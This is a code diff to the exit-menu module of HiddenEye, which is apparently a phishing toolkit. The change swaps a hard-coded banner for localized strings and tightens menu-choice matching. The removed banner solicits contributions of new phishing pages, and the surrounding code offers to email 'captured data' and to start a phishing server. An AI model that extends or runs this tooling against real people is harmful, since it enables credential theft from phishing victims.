@@ -2,7 +2,8 @@ from Defs.ImportManager.unsorted_will_be_replaced import run_command, wait, chmo
 import Defs.ThemeManager.theme as theme
 import Defs.FeatureManager.EmailManager.email_prompt as email_prompt
 import Defs.ActionManager.Server.server_menu as server_menu
-
+import Defs.LocalizationManager.lang_action_manager.lang_simple_informant as localization
+import Defs.LocalizationManager.lang_global_usage as global_localization
 
 default_palette = theme.default_palette
 
@@ -13,22 +14,20 @@ def exit_message(port):  # Message when HiddenEye exit
         run_command('sudo python3 HiddenEye.py')
     elif choice == 'M' or choice == 'm':
         email_prompt.captured_data_email_confirmation(port)
-    elif choice == 'S' or choice == 's':
+    elif choice ==  's':
     	server_menu.server_selection(port)
-    elif choice == 'X' or choice == 'x':
+    elif choice == 'x':
         run_command('clear')
-        print('''
-                  {1}HIDDEN EYE {1}BY: DARKSEC TEAM
-            {0}https://dark-sec-official.com
-  {1}  [[*]] IF YOU LIKE THIS TOOL, THEN PLEASE HELP TO BECOME BETTER.
-  {0}
-     [{1}!{0}] PLEASE LET US KNOW , IF ANY PHISHING PAGE GOT BROKEN .
-     [{1}!{0}] MAKE PULL REQUEST, LET US KNOW YOU SUPPORT US.
-     [{1}!{0}] IF YOU HAVE MORE PHISHING PAGES, THEN JUST MAKE A PULL REQUEST.
-     [{1}!{0}] PLEASE DON'T HARM ANYONE , ITS ONLY FOR EDUCATIONAL PURPOSE.
-     [{1}!{0}] WE WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS TOOL
-
-  {1}  [[*]] THANKS FOR USE THIS TOOL. HAPPY HACKING ... GOOD BYE \n '''.format(default_palette[2], default_palette[0]))
+        print(global_localization.hidden_eye_logo)
+        print('                             ' + global_localization.by_darksec)
+        print('                       ' + global_localization.official_website_link)
+        print(localization.lang_exit_message["help_to_improve_this_tool"])
+        print(localization.lang_exit_message["tell_if_page_got_broken"])
+        print(localization.lang_exit_message["make_your_pull_request_or_issue"])
+        print(localization.lang_exit_message["small_disclaimer_suggestion"])
+        print(localization.lang_exit_message["forum_suggestion"])
+        print(localization.lang_exit_message["financial_support"])
+        print(localization.lang_exit_message["thank_you"])
     else:
         run_command('clear')
         return exit_message(port)
